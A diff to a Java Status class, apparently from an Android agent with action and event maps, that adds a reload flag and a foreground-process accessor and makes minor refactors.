@@ -75,13 +75,19 @@ public class Status {
 
 	private boolean deviceAdmin;
 
+	private boolean reload;
+
 	static public boolean wifiConnected = false;
 	static public boolean gsmConnected = false;
+	
+	RunningProcesses runningProcess = new RunningProcesses();
 
 	/**
 	 * Instantiates a new status.
 	 */
 	private Status() {
+		
+		
 		agentsMap = new HashMap<String, ConfModule>();
 		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
@@ -382,7 +388,7 @@ public class Status {
 			Check.requires(actionsMap != null, " (triggerAction) Assert failed, null actionsMap");
 		}
 
-		Action action = actionsMap.get(new Integer(i));
+		Action action = actionsMap.get(Integer.valueOf(i));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(action != null, " (triggerAction) Assert failed, null action");
@@ -448,7 +454,7 @@ public class Status {
 					tsem.wait();
 				} else {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (getTriggeredActions): have act not empty, don't wait");
+						//Check.log(TAG + " (getTriggeredActions): have act not empty, don't wait");
 					}
 				}
 			}
@@ -696,6 +702,26 @@ public class Status {
 				}
 			}
 		}
+	}
+	
+	public synchronized void setReload() {
+		this.reload = true;
+	}
+
+	public synchronized boolean wantsReload() {
+		return this.reload; 
+	}
+
+	public synchronized void unsetReload() {
+		this.reload = false;
+	}
+
+	public String getForeground() {
+		return runningProcess.getForeground();
+	}
+
+	public RunningProcesses getRunningProcess() {
+		return runningProcess;
 	}
 
 }
